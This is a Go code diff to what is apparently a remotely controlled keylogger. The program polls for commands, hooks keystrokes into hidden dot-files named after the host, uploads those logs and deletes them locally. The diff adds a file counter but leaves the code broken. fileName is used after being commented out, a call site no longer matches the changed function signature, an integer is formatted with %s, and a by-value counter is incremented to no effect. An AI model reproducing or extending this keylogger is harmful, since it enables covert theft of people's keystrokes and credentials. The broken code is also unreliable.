@@ -32,11 +32,13 @@ func main() {
 
 	putHost(hostName)
 
-	runTime := time.Now()
-	fileName := fmt.Sprintf(".%s - %s %s.txt",
-	hostName,
-	runTime.Format("Jan 02 2006"),
-	runTime.Format(time.Kitchen))
+	var count int = 0
+
+	// runTime := time.Now()
+	// fileName := fmt.Sprintf(".%s - %s %s.txt",
+	// hostName,
+	// runTime.Format("Jan 02 2006"),
+	// runTime.Format(time.Kitchen))
 
 	cmdChan := make(chan string)
 	go pollCmds(hostName, cmdChan)
@@ -47,7 +49,7 @@ func main() {
 			go startKeylog(hostName, fileName, cmdChan)
 		}
 		if cmd == "upload" {
-			go uploadFile(fileName)
+			go uploadFile(fileName, count)
 			hook.StopEvent()
 		}
 		if cmd == "stop" {
@@ -69,8 +71,15 @@ func pollCmds(hostName string, cmdChan chan<- string) {
 	}
 }
 
-func startKeylog(hostName string, fileName string, cmdChan chan string) {
+func startKeylog(hostName string, fileName string, cmdChan chan string, count int) {
 	evChan := hook.Start()
+
+	runTime := time.Now()
+	fileName := fmt.Sprintf(".%s - %s %s (%s).txt",
+	hostName,
+	runTime.Format("Jan 02 2006"),
+	runTime.Format(time.Kitchen),
+	count)
 
 	var lastTime time.Time
 
@@ -101,7 +110,7 @@ func startKeylog(hostName string, fileName string, cmdChan chan string) {
 	}
 }
 
-func uploadFile(fileName string) error {
+func uploadFile(fileName string, count int) error {
 
 	file, err := os.Open(fileName)
 	if err != nil {
@@ -123,6 +132,8 @@ func uploadFile(fileName string) error {
 	})
 
 	os.Remove(fileName)
+
+	count++
 
 	return err
 }
